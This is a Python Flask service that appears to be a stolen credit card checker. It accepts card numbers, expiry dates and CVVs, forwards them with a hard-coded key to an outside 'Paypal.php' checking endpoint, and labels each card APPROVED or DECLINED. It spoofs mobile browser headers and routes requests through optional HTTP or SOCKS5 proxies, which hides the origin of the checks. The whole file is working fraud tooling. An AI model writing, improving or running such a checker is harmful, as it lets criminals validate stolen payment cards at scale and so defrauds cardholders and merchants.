from flask import Flask, request, jsonify
import requests
import re

app = Flask(__name__)

def process_paypal_response(raw_text):
    """Extract status and response message from raw HTML"""
    # Check for server error responses (502 or 503)
    if '502' in raw_text or '503' in raw_text:
        return {
            "response": "CARD DECLINED",
            "status": "DECLINED"
        }

    # Check for approved status or specific conditions
    if 'text-success">APPROVED<' in raw_text or 'EXISTING_ACCOUNT_RESTRICTED' in raw_text:
        status = "APPROVED"
        parts = raw_text.split('class="text-success">')
        if len(parts) > 2:
            response_msg = parts[2].split('</span>')[0].strip()
        else:
            response_msg = "PAYPAL_APPROVED" if 'APPROVED' in raw_text else "EXISTING_ACCOUNT_RESTRICTED"
    elif 'CARD ADDED' in raw_text:
        status = "APPROVED"
        response_msg = "CARD ADDED"
    else:
        # Check for declined status
        status = "DECLINED"
        parts = raw_text.split('class="text-danger">')
        if len(parts) > 2:
            response_msg = parts[2].split('</span>')[0].strip()
        else:
            response_msg = "CARD DECLINED"

    return {
        "response": response_msg,
        "status": status
    }

def check_paypal_card(cc_details, use_proxy=False, proxies=None, proxy_type=None):
    """Check PayPal status for a single card"""
    if not len(cc_details.split('|')) == 4:
        return {
            "response": "Invalid format. Use CC|MM|YYYY|CVV",
            "status": "DECLINED",
            "gateway": "Paypal [0.1$]"
        }

    headers = {
        'authority': 'wizvenex.com',
        'accept': '*/*',
        'accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'origin': 'https://wizvenex.com',
        'referer': 'https://wizvenex.com/',
        'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
        'x-requested-with': 'XMLHttpRequest',
    }

    # New headers from the provided example
    new_headers = {
        "sec-ch-ua": '"Chromium";v="137", "Not/A)Brand";v="24"',
        "Accept": "*/*",
        "Referer": "https://wizvenex.com/",
        "X-Requested-With": "XMLHttpRequest",
        "sec-ch-ua-mobile": "?1",
        "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36",
        "sec-ch-ua-platform": '"Android"',
    }

    # Use the new headers
    headers.update(new_headers)

    # Parameters for the GET request
    params = {
        "lista": cc_details,
        "key": "WIZ-707DEDDB6566D",
        "use_proxy": str(use_proxy).lower() if use_proxy is not None else "false",
    }

    # Add proxy parameters if provided
    if use_proxy and proxies and proxy_type:
        params["proxies"] = proxies
        params["proxy_type"] = proxy_type

    # Prepare proxy configuration for requests
    proxy_config = None
    if use_proxy and proxies and proxy_type:
        proxy_parts = proxies.split(':')
        if len(proxy_parts) >= 4:
            proxy_host = proxy_parts[0]
            proxy_port = proxy_parts[1]
            proxy_user = proxy_parts[2]
            proxy_pass = proxy_parts[3]
            
            if proxy_type.lower() == "http":
                proxy_config = {
                    "http": f"http://{proxy_user}:{proxy_pass}@{proxy_host}:{proxy_port}",
                    "https": f"http://{proxy_user}:{proxy_pass}@{proxy_host}:{proxy_port}"
                }
            elif proxy_type.lower() == "socks5":
                proxy_config = {
                    "http": f"socks5://{proxy_user}:{proxy_pass}@{proxy_host}:{proxy_port}",
                    "https": f"socks5://{proxy_user}:{proxy_pass}@{proxy_host}:{proxy_port}"
                }

    try:
        response = requests.get(
            'https://wizvenex.com/Paypal.php',
            headers=headers,
            params=params,
            proxies=proxy_config,
            timeout=30
        )
        result = process_paypal_response(response.text)
        result["gateway"] = "Paypal [0.1$]"
        return result

    except requests.exceptions.Timeout:
        return {
            "response": "TIMEOUT_ERROR",
            "status": "ERROR",
            "gateway": "Paypal [0.1$]"
        }
    except Exception as e:
        return {
            "response": f"REQUEST_FAILED: {str(e)}",
            "status": "ERROR",
            "gateway": "Paypal [0.1$]"
        }

@app.route('/gateway=paypal0.1$/cc=', methods=['GET'])
def paypal_gateway():
    cc_details = request.args.get('cc')
    use_proxy = request.args.get('use_proxy', 'false').lower() == 'true'
    proxies = request.args.get('proxies')
    proxy_type = request.args.get('proxy_type', 'http')
    
    if not cc_details:
        return jsonify({
            "response": "Missing cc parameter. Use CC|MM|YYYY|CVV",
            "status": "ERROR",
            "gateway": "Paypal [0.1$]"
        }), 400

    result = check_paypal_card(cc_details, use_proxy, proxies, proxy_type)
    return jsonify(result)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=False)
